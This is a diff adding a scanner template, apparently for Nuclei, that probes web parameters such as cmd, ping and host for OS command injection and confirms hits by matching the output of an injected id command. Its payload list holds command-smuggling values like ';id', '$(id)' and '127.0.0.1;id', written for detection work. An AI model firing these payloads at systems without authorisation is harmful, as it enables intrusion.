@@ -1,0 +1,51 @@
+id: command-injection
+info:
+  name: OS Command Injection
+  author: sif
+  severity: critical
+  description: Detects OS command injection by confirming the output of an injected id command in the response
+  tags: [rce, injection, command-injection, owasp-top10]
+
+type: http
+
+http:
+  method: GET
+  paths:
+    - "{{BaseURL}}/?cmd={{payload}}"
+    - "{{BaseURL}}/?exec={{payload}}"
+    - "{{BaseURL}}/?ping={{payload}}"
+    - "{{BaseURL}}/?host={{payload}}"
+    - "{{BaseURL}}/?ip={{payload}}"
+    - "{{BaseURL}}/?query={{payload}}"
+    - "{{BaseURL}}/?q={{payload}}"
+
+  # each payload chains the id command onto the parameter value; a match
+  # requires id's actual output, so a benign echo of the payload cannot
+  # trigger the detector.
+  payloads:
+    - ";id"
+    - "|id"
+    - "||id"
+    - "&&id"
+    - "`id`"
+    - "$(id)"
+    - "%0aid"
+    - ";id;"
+    - "127.0.0.1;id"
+
+  threads: 10
+
+  matchers:
+    - type: regex
+      part: body
+      regex:
+        - "\\buid=[0-9]+\\([a-z0-9_.-]+\\)\\s+gid=[0-9]+\\("
+      condition: or
+
+  extractors:
+    - type: regex
+      name: id_output
+      part: body
+      regex:
+        - "(\\buid=[0-9]+\\([a-z0-9_.-]+\\)\\s+gid=[0-9]+\\([a-z0-9_.-]+\\))"
+      group: 1
